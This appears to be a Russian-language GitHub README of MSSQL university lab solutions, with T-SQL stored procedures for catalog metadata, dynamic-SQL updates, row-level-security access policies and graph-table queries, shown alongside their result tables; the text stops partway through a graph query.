<h1 align="center"><a href=""><img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/></a> MSSQL</h1>

<p align="center">
  <a href="#-lab1"><img alt="lab1" src="https://img.shields.io/badge/Lab1-blue"></a> 
  <a href="#-lab2"><img alt="lab2" src="https://img.shields.io/badge/Lab2-red"></a>
  <a href="#-lab3"><img alt="lab3" src="https://img.shields.io/badge/Lab3-green"></a>
  <a href="#-lab4"><img alt="lab4" src="https://img.shields.io/badge/Lab4-yellow"></a>
  <a href="#-lab5"><img alt="lab5" src="https://img.shields.io/badge/Lab5-gray"></a>
  <a href="#-lab6"><img alt="lab6" src="https://img.shields.io/badge/Lab6-orange"></a> 
  <a href="#-lab7"><img alt="lab7" src="https://img.shields.io/badge/Lab7-brown"></a>
  <a href="#-lab8"><img alt="lab8" src="https://img.shields.io/badge/Lab8-purple"></a>
  <a href="#-lab9"><img alt="lab9" src="https://img.shields.io/badge/Lab9-violet"></a> 
</p>

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab1
<h3 align="center">
  <a href="#client"></a>
  1.1 Разработать представления или хранимые процедуры для выполнения заданий.
</h3>

#### №6. Вывести все таблицы SQL Server без столбца identity.
```tsql
--- №6
-- Пояснение: запрос находит таблицы, у которых все столбцы не имеют IDENTITY - в параметрах "Удостоверение"
-- т.е. авто-приращение идентификатора при создании новых записей
CREATE OR ALTER PROCEDURE GetTablesWithoutIdentityColumns
AS
BEGIN
    SET NOCOUNT ON;

    DECLARE @dbname NVARCHAR(128);
    DECLARE @sql NVARCHAR(MAX);

    -- Создаем курсор для перебора всех баз данных
    DECLARE db_cursor CURSOR FOR
    SELECT name
    FROM sys.databases

    OPEN db_cursor;

    FETCH NEXT FROM db_cursor INTO @dbname;

    WHILE @@FETCH_STATUS = 0
    BEGIN
        SET @sql =
        '
            SELECT ''' + @dbname + ''' AS DatabaseName, s.name AS SchemaName, t.name AS TableName, t.object_id AS ObjectId
            FROM ' + QUOTENAME(@dbname) + '.sys.tables t
            JOIN ' + QUOTENAME(@dbname) + '.sys.schemas s ON t.schema_id = s.schema_id
            WHERE t.object_id NOT IN (
                SELECT c.object_id
                FROM ' + QUOTENAME(@dbname) + '.sys.columns c
                WHERE c.is_identity = 1
            )
        ';

        EXEC sp_executesql @sql;

        FETCH NEXT FROM db_cursor INTO @dbname;
    END;

    CLOSE db_cursor;
    DEALLOCATE db_cursor;
END;
```

```tsql
-- Использование
EXEC GetTablesWithoutIdentityColumns;
```

| DatabaseName | SchemaName | TableName | ObjectId |
| :--- | :--- | :--- | :--- |
| master | dbo | spt\_fallback\_db | 117575457 |
| master | dbo | spt\_fallback\_dev | 133575514 |
| master | dbo | spt\_fallback\_usg | 149575571 |
| master | dbo | spt\_monitor | 1803153469 |
| master | dbo | MSreplication\_options | 2107154552 |

| DatabaseName | SchemaName | TableName | ObjectId |
| :--- | :--- | :--- | :--- |
| Northwind | dbo | Customers | 901578250 |
| Northwind | dbo | Order Details | 965578478 |

| DatabaseName | SchemaName | TableName | ObjectId |
| :--- | :--- | :--- | :--- |
| test | dbo | test\_table | 901578250 |

| DatabaseName | SchemaName | TableName | ObjectId |
| :--- | :--- | :--- | :--- |
| msdb | dbo | sysnotifications | 2099048 |
| msdb | dbo | sysutility\_ucp\_snapshot\_partitions\_internal | 13243102 |
| msdb | dbo | syscachedcredentials | 34099162 |
| msdb | dbo | syscollector\_blobs\_internal | 36195179 |
| msdb | dbo | sysutility\_mi\_volumes\_stage\_internal | 93243387 |
| msdb | dbo | syscollector\_tsql\_query\_collector | 100195407 |
| msdb | dbo | sysutility\_ucp\_aggregated\_dac\_health\_internal | 121767491 |
| msdb | dbo | sysutility\_mi\_cpu\_stage\_internal | 173243672 |
| msdb | dbo | sysssispackages | 231671873 |
| msdb | dbo | sysssispackagefolders | 311672158 |
| msdb | dbo | sysutility\_ucp\_aggregated\_mi\_health\_internal | 361768346 |
| msdb | dbo | syspolicy\_execution\_internal | 432720594 |
| ...  |



#### №29 Вывести все таблицы SQL Server, на которые напрямую ссылается хотя бы одно представление.
```tsql
-- №29
CREATE OR ALTER PROCEDURE GetTablesReferencedByViews
AS
BEGIN
    SET NOCOUNT ON;

    DECLARE @dbname NVARCHAR(128);
    DECLARE @sql NVARCHAR(MAX);

    -- Создаем курсор для перебора всех баз данных
    DECLARE db_cursor CURSOR FOR
    SELECT name
    FROM sys.databases

    OPEN db_cursor;

    FETCH NEXT FROM db_cursor INTO @dbname;

    WHILE @@FETCH_STATUS = 0
    BEGIN
        SET @sql =
        '
            SELECT DISTINCT ''' + @dbname + ''' AS DatabaseName, s.name AS SchemaName, t.name AS TableName, t.object_id AS TableId
            FROM ' + QUOTENAME(@dbname) + '.sys.tables t
            JOIN ' + QUOTENAME(@dbname) + '.sys.schemas s ON t.schema_id = s.schema_id
            JOIN ' + QUOTENAME(@dbname) + '.sys.sql_expression_dependencies d ON t.object_id = d.referenced_id
            JOIN ' + QUOTENAME(@dbname) + '.sys.views v ON d.referencing_id = v.object_id
            WHERE d.referenced_class_desc = ''OBJECT_OR_COLUMN''
            ORDER BY t.name;
        ';

        EXEC sp_executesql @sql;

        FETCH NEXT FROM db_cursor INTO @dbname;
    END;

    CLOSE db_cursor;
    DEALLOCATE db_cursor;
END;
```

```tsql
-- Создание представления для теста
CREATE VIEW vw_EmployeeNames AS
SELECT FirstName, LastName, Country
FROM Employees;
```

```tsql
-- Использование
EXEC GetTablesReferencedByViews;
```

| DatabaseName | SchemaName | TableName | TableId |
| :--- | :--- | :--- | :--- |
| Northwind | dbo | Employees | 933578364 |



#### №38 Вывести все столбцы первичного ключа для указанной таблицы.
```tsql
-- №38
-- Пояснение: процедура находит названия столбцов в указанной таблице, которые являются первичными ключами
CREATE OR ALTER PROCEDURE GetPrimaryKeyColumns
    @DatabaseName NVARCHAR(128),
    @SchemaName NVARCHAR(128),
    @TableName NVARCHAR(128)
AS
BEGIN
    SET NOCOUNT ON;

    DECLARE @SQL NVARCHAR(MAX);

    -- Формируем динамический SQL запрос
    SET @SQL = N'
        SELECT kcu.COLUMN_NAME
        FROM ' + QUOTENAME(@DatabaseName) + '.INFORMATION_SCHEMA.TABLE_CONSTRAINTS AS tc
        JOIN ' + QUOTENAME(@DatabaseName) + '.INFORMATION_SCHEMA.KEY_COLUMN_USAGE AS kcu
        ON tc.CONSTRAINT_NAME = kcu.CONSTRAINT_NAME
        AND tc.TABLE_SCHEMA = kcu.TABLE_SCHEMA
        WHERE tc.TABLE_NAME = @TableName
        AND tc.TABLE_SCHEMA = @SchemaName
        AND tc.CONSTRAINT_TYPE = ''PRIMARY KEY''
    ';

    -- Выполняем динамический SQL запрос с использованием sp_executesql
    EXEC sp_executesql @SQL,
        N'@TableName NVARCHAR(128), @SchemaName NVARCHAR(128)',
        @TableName=@TableName, @SchemaName=@SchemaName;
END;
```

```tsql
-- Использование
EXEC GetPrimaryKeyColumns @DatabaseName = 'Northwind', @SchemaName = 'dbo', @TableName = 'Order Details';
```

| COLUMN\_NAME |
| :--- |
| OrderID |
| ProductID |

<h3 align="center">
  <a href="#client"></a>
  1.2 Написать хранимую процедуру, которая для указанного объекта, заданного именем и схемой, вернет его свойства
</h3>

```tsql
CREATE OR ALTER PROCEDURE GetObjectProperties
    @SchemaName NVARCHAR(128),
    @ObjectName NVARCHAR(128)
AS
BEGIN
    SET NOCOUNT ON;

    -- Определение типа объекта
    DECLARE @ObjectType NVARCHAR(2);
    SELECT @ObjectType = TYPE
    FROM sys.objects
    WHERE name = @ObjectName AND SCHEMA_NAME(schema_id) = @SchemaName;

    IF @ObjectType IS NULL
    BEGIN
        PRINT 'Объект не найден.';
        RETURN;
    END

    -- Общая информация: дата создания, модификация
    SELECT
        sys_obj.name AS ObjectName,
        SCHEMA_NAME(sys_obj.schema_id) AS SchemaName,
        sys_obj.type_desc AS ObjectType,
        sys_obj.create_date AS CreationDate,
        sys_obj.modify_date AS LastModifiedDate
    FROM sys.objects sys_obj
    WHERE sys_obj.name = @ObjectName AND SCHEMA_NAME(sys_obj.schema_id) = @SchemaName;

    -- Права доступа
    SELECT
        dp.permission_name AS PermissionName,
        dp.state_desc AS PermissionState,
        dp.grantee_principal_id AS GranteePrincipalId,
        dp.grantor_principal_id AS GrantorPrincipalId,
        dp.type AS PermissionType
    FROM sys.database_permissions dp
    WHERE dp.major_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));

    -- Таблицы(U) и представления(V)
    IF @ObjectType IN ('U', 'V')
    BEGIN
        -- Столбцы
        SELECT 
            columns.name AS ColumnName,
            types.name AS DataType,
            columns.max_length AS MaxLength,
            columns.is_nullable AS IsNullable,
            columns.is_identity AS IsIdentity
        FROM sys.columns columns
        JOIN sys.types types ON columns.user_type_id = types.user_type_id
        WHERE columns.object_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));

        -- Ограничения
        SELECT 
            key_constraints.name AS ConstraintName,
            key_constraints.type_desc AS ConstraintType
        FROM sys.key_constraints key_constraints
        WHERE key_constraints.parent_object_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));

        -- Триггеры
        SELECT 
            t.name AS TriggerName,
            t.is_disabled AS IsDisabled
        FROM sys.triggers t
        WHERE t.parent_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));

        -- Количество строк
        DECLARE @RowCount INT;
        SELECT @RowCount = SUM(partitions.rows)
        FROM sys.partitions partitions
        WHERE partitions.object_id =
              OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName)) AND partitions.index_id IN (0, 1);

        PRINT 'Количество строк: ' + CAST(@RowCount AS NVARCHAR(100));

        -- Объекты, ссылающиеся на таблицу
        SELECT 
            referencing_object.name AS ReferencingObject,
            referencing_object.type_desc AS ReferencingType
        FROM sys.foreign_keys foreign_keys
        JOIN sys.objects referencing_object ON foreign_keys.parent_object_id = referencing_object.object_id
        WHERE foreign_keys.referenced_object_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));
    END

    -- Процедуры(P) и функции(FN/IF/TF)
    ELSE IF @ObjectType IN ('P', 'FN', 'IF', 'TF')
    BEGIN
        -- Параметры
        SELECT 
            parameters.name AS ParameterName,
            types.name AS DataType,
            parameters.max_length AS MaxLength,
            parameters.is_output AS IsOutput
        FROM sys.parameters parameters
        JOIN sys.types types ON parameters.system_type_id = types.system_type_id
        WHERE parameters.object_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));

        -- Текст процедуры или функции
        SELECT 
            OBJECT_DEFINITION(OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName))) AS ObjectText;

        -- Зависимости
        SELECT 
            referenced_entity.name AS ReferencedObjectName,
            referenced_entity.type_desc AS ReferencedObjectType
        FROM sys.sql_expression_dependencies expr_dependencies
        JOIN sys.objects referenced_entity ON expr_dependencies.referenced_id = referenced_entity.object_id
        WHERE expr_dependencies.referencing_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));
    END

    -- Триггеры(TR)
    ELSE IF @ObjectType = 'TR'
    BEGIN
        -- Детали триггера
        SELECT 
            triggers.name AS TriggerName,
            triggers.is_disabled AS IsDisabled,
            OBJECT_DEFINITION(triggers.object_id) AS TriggerText
        FROM sys.triggers triggers
        WHERE triggers.object_id = OBJECT_ID(QUOTENAME(@SchemaName) + '.' + QUOTENAME(@ObjectName));
    END

    ELSE
    BEGIN
        PRINT 'Тип объекта не поддерживается';
    END
END;
```

```tsql
CREATE USER TestUser WITHOUT LOGIN;
GRANT SELECT, INSERT, UPDATE, DELETE ON dbo.Employees TO TestUser;
-- Использование (пример с таблицей)
EXEC GetObjectProperties 'dbo', 'Customers';
```

| ObjectName | SchemaName | ObjectType | CreationDate | LastModifiedDate | PermissionName | PermissionState |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| Customers | dbo | USER\_TABLE | 2024-11-04 01:22:50.220 | 2024-11-04 01:22:50.220 | null | null |

| ColumnName | DataType | MaxLength | IsNullable | IsIdentity |
| :--- | :--- | :--- | :--- | :--- |
| CustomerID | nchar | 10 | false | false |
| CompanyName | nvarchar | 80 | false | false |
| ContactName | nvarchar | 60 | true | false |
| ContactTitle | nvarchar | 60 | true | false |
| Address | nvarchar | 120 | true | false |
| City | nvarchar | 30 | true | false |
| Region | nvarchar | 30 | true | false |
| PostalCode | nvarchar | 20 | true | false |
| Country | nvarchar | 30 | true | false |
| Phone | nvarchar | 48 | true | false |
| Fax | nvarchar | 48 | true | false |

| ConstraintName | ConstraintType |
| :--- | :--- |
| PK\_Customers | PRIMARY\_KEY\_CONSTRAINT |

| TriggerName | IsDisabled |
| :--- | :--- |

| ReferencingObject | ReferencingType |
| :--- | :--- |

| PermissionName | PermissionState | GranteePrincipalId | GrantorPrincipalId | PermissionType |
| :--- | :--- | :--- | :--- | :--- |
| DELETE | GRANT | 5 | 1 | DL   |
| INSERT | GRANT | 5 | 1 | IN   |
| SELECT | GRANT | 5 | 1 | SL   |
| UPDATE | GRANT | 5 | 1 | UP   |


```tsql
GRANT SELECT ON vw_EmployeeNames TO TestUser;
-- Использование (пример с представлением)
EXEC GetObjectProperties 'dbo', 'vw_EmployeeNames';
```

| ObjectName | SchemaName | ObjectType | CreationDate | LastModifiedDate | PermissionName | PermissionState |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| vw\_EmployeeNames | dbo | VIEW | 2024-11-04 02:00:16.240 | 2024-11-04 02:00:16.240 | null | null |

| ColumnName | DataType | MaxLength | IsNullable | IsIdentity |
| :--- | :--- | :--- | :--- | :--- |
| FirstName | nvarchar | 20 | false | false |
| LastName | nvarchar | 40 | false | false |
| Country | nvarchar | 30 | true | false |

| ConstraintName | ConstraintType |
| :--- | :--- |

| TriggerName | IsDisabled |
| :--- | :--- |

| ReferencingObject | ReferencingType |
| :--- | :--- |

| PermissionName | PermissionState | GranteePrincipalId | GrantorPrincipalId | PermissionType |
| :--- | :--- | :--- | :--- | :--- |
| SELECT | GRANT | 5 | 1 | SL   |


```tsql
GRANT EXECUTE ON GetPrimaryKeyColumns TO TestUser;
-- Использование (пример с процедурой)
EXEC GetObjectProperties 'dbo', 'GetPrimaryKeyColumns';
```

| ObjectName | SchemaName | ObjectType | CreationDate | LastModifiedDate | PermissionName | PermissionState |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| GetPrimaryKeyColumns | dbo | SQL\_STORED\_PROCEDURE | 2024-11-04 01:48:34.420 | 2024-11-04 01:48:34.420 | null | null |

| ParameterName | DataType | MaxLength | IsOutput |
| :--- | :--- | :--- | :--- |
| @TableName | nvarchar | 256 | false |
| @TableName | sysname | 256 | false |

| ObjectText |
| :--- |
| CREATE PROCEDURE GetPrimaryKeyColumns<br/>    @TableName NVARCHAR\(128\)<br/>AS<br/>BEGIN<br/>    SET NOCOUNT ON;<br/><br/>    SELECT <br/>        kcu.COLUMN\_NAME<br/>    FROM <br/>        INFORMATION\_SCHEMA.TABLE\_CONSTRAINTS AS tc<br/>    JOIN <br/>        INFORMATION\_SCHEMA.KEY\_COLUMN\_USAGE AS kcu <br/>        ON tc.CONSTRAINT\_NAME = kcu.CONSTRAINT\_NAME<br/>    WHERE <br/>        tc.TABLE\_NAME = @TableName <br/>        AND tc.CONSTRAINT\_TYPE = 'PRIMARY KEY';<br/>END |

| ReferencingObjectName | ReferencingObjectType |
| :--- | :--- |

| PermissionName | PermissionState | GranteePrincipalId | GrantorPrincipalId | PermissionType |
| :--- | :--- | :--- | :--- | :--- |
| EXECUTE | GRANT | 5 | 1 | EX   |


# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab2
<h3 align="center">
  <a href="#client"></a>
  2 Создать процедуру, которая принимает в качестве параметров имя таблицы и имена двух полей этой таблице и добавляет содержимое первого поля к содержимому второго. 
  Если второе поле пустое, то просто копируется содержимое поля 1 в содержимое поля 2 и наоборот.
</h3>

```tsql
CREATE PROCEDURE UpdateFields
    @TableName NVARCHAR(MAX),
    @Field1 NVARCHAR(MAX),
    @Field2 NVARCHAR(MAX)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX)

    -- Формируем динамический SQL
    SET @sql = N'UPDATE ' + QUOTENAME(@TableName) + ' SET ' +
        QUOTENAME(@Field2) + ' = CASE ' +
            'WHEN ' + QUOTENAME(@Field2) + ' IS NULL AND ' + QUOTENAME(@Field1) + ' IS NOT NULL THEN ' + QUOTENAME(@Field1) + ' ' +
            'WHEN ' + QUOTENAME(@Field2) + ' IS NOT NULL AND ' + QUOTENAME(@Field1) + ' IS NOT NULL THEN ' + QUOTENAME(@Field2) + ' + ' + QUOTENAME(@Field1) + ' ' +
            'WHEN ' + QUOTENAME(@Field1) + ' IS NULL AND ' + QUOTENAME(@Field2) + ' IS NOT NULL THEN ' + QUOTENAME(@Field2) + ' ' +
            'END, ' +
        QUOTENAME(@Field1) + ' = CASE ' +
            'WHEN ' + QUOTENAME(@Field1) + ' IS NULL AND ' + QUOTENAME(@Field2) + ' IS NOT NULL THEN ' + QUOTENAME(@Field2) + ' ' +
            'ELSE ' + QUOTENAME(@Field1) + ' ' +
            'END' +
        ' WHERE ' + QUOTENAME(@Field1) + ' IS NOT NULL OR ' + QUOTENAME(@Field2) + ' IS NOT NULL;'

    -- Выполнение динамического SQL с помощью sp_executesql
    EXEC sp_executesql @sql
END
```

```tsql
-- Тестовые данные
CREATE TABLE SampleTable (
    ID INT PRIMARY KEY IDENTITY(1,1),
    Field1 NVARCHAR(100),
    Field2 NVARCHAR(100)
);

INSERT INTO SampleTable (Field1, Field2) VALUES ('Hello', NULL);
INSERT INTO SampleTable (Field1, Field2) VALUES (NULL, 'World');
INSERT INTO SampleTable (Field1, Field2) VALUES ('Goodbye', 'Everyone');
INSERT INTO SampleTable (Field1, Field2) VALUES (NULL, NULL);
```

```tsql
-- До использования
SELECT * FROM SampleTable;
```

| ID | Field1 | Field2 |
| :--- | :--- | :--- |
| 1 | Hello | null |
| 2 | null | World |
| 3 | Goodbye | Everyone |
| 4 | null | null |


```tsql
-- Использование процедуры
EXEC UpdateFields @TableName = 'SampleTable', @Field1 = 'Field1', @Field2 = 'Field2';
```

```tsql
-- После использования
SELECT * FROM SampleTable;
```

| ID | Field1 | Field2 |
| :--- | :--- | :--- |
| 1 | Hello | Hello |
| 2 | World | World |
| 3 | Goodbye | EveryoneGoodbye |
| 4 | null | null |

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab3
<h3 align="center">
  <a href="#client"></a>
  Политика доступа на основе RLS. Мандатный доступ.
</h3>

#### Часть А.
```tsql
-- Инициализация тестовых и прочих данных
USE Lab3;

-- Создание и заполнение таблицы с информацией и уровнем доступа для нее
CREATE TABLE [Information](
    ID INT PRIMARY KEY IDENTITY(1,1) NOT NULL,
    [Name] NVARCHAR(75) NOT NULL,
    [Classification] NVARCHAR(75) NOT NULL
)
INSERT INTO [Information]([Name], [Classification])
VALUES
(N'Ivan Ivanov', N'SECRET'),
(N'Peter Petrov', N'TOP SECRET'),
(N'Michael Sidorov', N'UNCLASSIFIED')

-- Создание и заполнение таблицы пользователей и их уровня доступа
CREATE TABLE [Users](
	[User] NVARCHAR(75) PRIMARY KEY NOT NULL,
	[Clearance] NVARCHAR(75) NOT NULL
)
INSERT INTO [Users]([User], [Clearance])
VALUES
(N'Anna', N'SECRET'),
(N'Alex', N'UNCLASSIFIED')

-- Создание и заполнение таблицы уровней доступа
CREATE TABLE [AccessLevel](
	[Label] NVARCHAR(75) PRIMARY KEY NOT NULL,
	[Level] INT NOT NULL
)
INSERT INTO [AccessLevel]([Label], [Level])
VALUES
(N'TOP SECRET',2),
(N'SECRET',1),
(N'UNCLASSIFIED',0)

-- Создание пользователей, ролей и выдача прав
CREATE USER [Anna] WITHOUT LOGIN WITH DEFAULT_SCHEMA=[dbo]
CREATE USER [Alex] WITHOUT LOGIN WITH DEFAULT_SCHEMA=[dbo]
CREATE ROLE [Пользователь]
ALTER ROLE [Пользователь] ADD MEMBER [Anna]
ALTER ROLE [Пользователь] ADD MEMBER [Alex]
GRANT SELECT ON [dbo].[Information] TO [Пользователь]
```

```tsql
-- Создание схемы Security для объектов, связанных с безопасностью
CREATE SCHEMA Security

-- Создание предиката безопасности, который проверяет, имеет ли текущий пользователь доступ к записи с указанной классификацией
CREATE OR ALTER FUNCTION Security.fn_FilterInformationByAccessLevel(@Classification AS NVARCHAR(75))
RETURNS TABLE
WITH SCHEMABINDING
AS
RETURN SELECT 1 AS fn_result
WHERE(
    -- Получение числового уровня допуска текущего пользователя
    (SELECT [Level]
     FROM [dbo].[AccessLevel] AS AccessLevel
     JOIN [dbo].[Users] AS Users ON Users.[Clearance] = AccessLevel.[Label]
     WHERE Users.[User] = current_user)
	>=
    -- Получение числового уровня секретности запрашиваемой строки
    (SELECT [Level]
     FROM [dbo].[AccessLevel] AS AccessLevel
     WHERE AccessLevel.[Label] = @Classification)
)
```

```tsql
-- Создание политики безопасности с применением предиката безопасности для таблицы
CREATE SECURITY POLICY Security.Information_RLS_Policy
ADD FILTER PREDICATE Security.fn_FilterInformationByAccessLevel([Classification])
ON [dbo].[Information]
WITH (STATE=ON)
```

Тестирование:
```tsql
EXECUTE AS USER = 'Anna';
SELECT * FROM [dbo].[Information]; -- запрос выполняется от имени пользователя Anna
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |
| 1 | Ivan Ivanov | SECRET |
| 3 | Michael Sidorov | UNCLASSIFIED |


```tsql
EXECUTE AS USER = 'Alex';
SELECT * FROM [dbo].[Information]; -- запрос выполняется от имени пользователя Alex
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |
| 3 | Michael Sidorov | UNCLASSIFIED |

#### Часть B. Задание 1
```tsql
-- Выдача разрешение на редактирование и просмотр
GRANT SELECT, UPDATE ON [dbo].[Information] to [Пользователь]

-- Создание триггера для обновления записи в зависимости от доступа пользователя 
CREATE OR ALTER TRIGGER UpClassification
ON [dbo].[Information]
AFTER UPDATE
AS
BEGIN
    DECLARE @UserClearance NVARCHAR(75)

    -- Получение уровня доступа текущего пользователя
    SELECT @UserClearance = [Clearance]
    FROM [dbo].[Users]
    WHERE [User] = CURRENT_USER

    -- Обновление в зависимости от уровня доступа пользователя
    UPDATE Information
    SET [Classification] = @UserClearance
    FROM [dbo].[Information] AS Information
    JOIN Inserted ON Information.ID = Inserted.ID
    WHERE Information.[Classification] != @UserClearance;
END
```

Тестирование:
```tsql
EXECUTE AS USER = 'Anna';
SELECT * FROM [dbo].[Information]
UPDATE [dbo].[Information]
SET [Name] = N'Michael Sidorov - UPDATED'
WHERE [Name] = N'Michael Sidorov'
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |
| 1 | Ivan Ivanov | SECRET |
| 3 | Michael Sidorov - UPDATED | SECRET |

```tsql
EXECUTE AS USER = 'Alex';
SELECT * FROM [dbo].[Information]
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |

#### Часть B. Задание 2
```tsql
-- Инициализация тестовых и прочих данных
CREATE TABLE [Roles](
	[Role] NVARCHAR(75) PRIMARY KEY NOT NULL,
	[Clearance] NVARCHAR(75) NOT NULL
)
INSERT INTO [Roles]([Role], [Clearance])
VALUES
(N'LowRole',N'UNCLASSIFIED'),
(N'MediumRole',N'SECRET'),
(N'HighRole',N'TOP SECRET')

ALTER ROLE [LowRole] ADD MEMBER [Alex]
ALTER ROLE [HighRole] ADD MEMBER [Anna]
```

```tsql
-- Функция для проверки разрешения на строку для пользователя (на основе ролей)
CREATE OR ALTER FUNCTION Security.fn_CheckInformationAccessByRole(@Classification AS NVARCHAR(75))
RETURNS TABLE
AS
RETURN
SELECT 1 AS fn_result
WHERE (
    -- Получить максимальный уровень доступа текущего пользователя.
    (SELECT MAX(AccessLevel.[Level])
     FROM [dbo].[AccessLevel] AS AccessLevel
     JOIN [dbo].[Roles] Roles ON AccessLevel.[Label] = Roles.[Clearance]
     JOIN sys.database_role_members RoleMembers ON Roles.[Role] = (
        SELECT name
        FROM sys.database_principals
        WHERE principal_id = RoleMembers.role_principal_id
     )
     JOIN sys.database_principals Principals ON RoleMembers.member_principal_id = Principals.principal_id
     WHERE Principals.[name] = CURRENT_USER)
    >=
    -- Получить уровень доступа для заданной строки
    (SELECT [Level]
     FROM [dbo].[AccessLevel] AS AccessLevel
     WHERE AccessLevel.[Label] = @Classification)
)
```

```tsql
-- Создание политики безопасности с применением предиката безопасности для таблицы
CREATE SECURITY POLICY Security.Information_RLS_Role_Policy
ADD FILTER PREDICATE Security.fn_CheckInformationAccessByRole([Classification])
ON [dbo].[Information]
WITH (STATE=ON, SCHEMABINDING=OFF)

GRANT SELECT ON [Security].[fn_CheckInformationAccessByRole] to [Пользователь]
```

Тестирование:
```tsql
EXECUTE AS USER = 'Anna';
SELECT * FROM [dbo].[Information]; -- запрос выполняется от имени пользователя Anna
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |
| 1 | Ivan Ivanov | SECRET |
| 2 | Peter Petrov | TOP SECRET |
| 3 | Michael Sidorov - UPDATED | SECRET |


```tsql
EXECUTE AS USER = 'Alex';
SELECT * FROM [dbo].[Information]; -- запрос выполняется от имени пользователя Alex
REVERT;
```

| ID | Name | Classification |
| :--- | :--- | :--- |


# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab4
<h3 align="center">
  <a href="#client"></a>
   Графы
</h3>

```tsql
USE painting

-- Начальная инициализация

CREATE TABLE SquaresNodesGraphTable (
    [Q_ID] int NOT NULL,
    [Q_NAME] varchar(35) NOT NULL
) AS NODE

CREATE TABLE PaintBallonNodesGraphTable(
    [V_ID] int NOT NULL,
    [V_NAME] varchar(35) NOT NULL,
    [V_COLOR] char(1) NOT NULL
) AS NODE

CREATE TABLE PaintVolumeInfoEdgeGraphTable (
    [B_DATETIME] datetime NOT NULL,
    [B_VOLUME] tinyint NOT NULL
) AS EDGE

INSERT INTO SquaresNodesGraphTable
SELECT [Q_ID], [Q_NAME]
FROM [dbo].[utQ]

INSERT INTO PaintBallonNodesGraphTable
SELECT [V_ID], [V_NAME],[V_COLOR]
FROM [dbo].[utV]

INSERT INTO PaintVolumeInfoEdgeGraphTable($from_id, $to_id, [B_DATETIME],[B_VOLUME])
SELECT Q.$node_id, V.$node_id, B.B_DATETIME, B.B_VOL
FROM [dbo].[SquaresNodesGraphTable] Q JOIN [dbo].[utB] B
ON Q.Q_ID = B.B_Q_ID
JOIN [dbo].[PaintBallonNodesGraphTable] V
ON B.B_V_ID = V.V_ID
```

#### Часть A. Задание 1

```tsql
-- 1. Найти квадраты, которые окрашивались красной краской. Вывести идентификатор квадрата и объем красной краски.
SELECT DISTINCT Q.Q_ID, SUM(B.[B_VOLUME]) SUM_VOL
FROM [dbo].[SquaresNodesGraphTable] Q,
     [dbo].[PaintVolumeInfoEdgeGraphTable] B,
     [dbo].[PaintBallonNodesGraphTable] V
WHERE MATCH (Q-(B)->V)
AND V.[V_COLOR] = 'R'
GROUP BY Q.Q_ID
```

| Q\_ID | SUM\_VOL |
| :--- | :--- |
| 1 | 255 |
| 2 | 255 |
| 3 | 255 |
| 4 | 255 |
| 5 | 255 |
| 6 | 255 |
| 7 | 255 |
| 8 | 50 |
| 9 | 255 |
| 10 | 255 |
| 11 | 255 |
| 12 | 255 |
| 14 | 50 |
| 15 | 100 |
| 17 | 20 |
| 19 | 20 |
| 21 | 100 |


```tsql
--2. Найти квадраты, которые окрашивались как красной, так и синей краской. Вывести: название квадрата.
SELECT DISTINCT Q.[Q_NAME]
FROM [dbo].[SquaresNodesGraphTable] Q,
     [dbo].[PaintVolumeInfoEdgeGraphTable] B1,
     [dbo].[PaintBallonNodesGraphTable] V1,
	 [dbo].[PaintVolumeInfoEdgeGraphTable] B2,
     [dbo].[PaintBallonNodesGraphTable] V2
WHERE MATCH (Q-(B1)->V1 AND Q-(B2)->V2)
AND V1.[V_COLOR] = 'R'
AND V2.[V_COLOR] = 'B'
```

| Q\_NAME |
| :--- |
| Square # 01 |
| Square # 02 |
| Square # 03 |
| Square # 05 |
| Square # 06 |
| Square # 07 |
| Square # 09 |
| Square # 10 |
| Square # 11 |
| Square # 12 |
| Square # 14 |


```tsql
--3. Найти квадраты, которые окрашивались всеми тремя цветами.
SELECT DISTINCT Q.[Q_NAME]
FROM [dbo].[SquaresNodesGraphTable] Q,
     [dbo].[PaintVolumeInfoEdgeGraphTable] B1,
     [dbo].[PaintBallonNodesGraphTable] V1,
	 [dbo].[PaintVolumeInfoEdgeGraphTable] B2,
     [dbo].[PaintBallonNodesGraphTable] V2,
	 [dbo].[PaintVolumeInfoEdgeGraphTable] B3,
     [dbo].[PaintBallonNodesGraphTable] V3
WHERE
MATCH (Q-(B1)->V1) AND V1.[V_COLOR] = 'R'
AND MATCH (Q-(B2)->V2) AND V2.[V_COLOR] = 'G'
AND MATCH (Q-(B3)->V3) AND V3.[V_COLOR] = 'B'
```

| Q\_NAME |
| :--- |
| Square # 01 |
| Square # 02 |
| Square # 03 |
| Square # 05 |
| Square # 06 |
| Square # 07 |
| Square # 09 |
| Square # 10 |
| Square # 11 |
| Square # 12 |

```tsql
--4. Найти баллончики, которыми окрашивали более одного квадрата.
SELECT DISTINCT V.[V_NAME]
FROM [dbo].[SquaresNodesGraphTable] Q1,
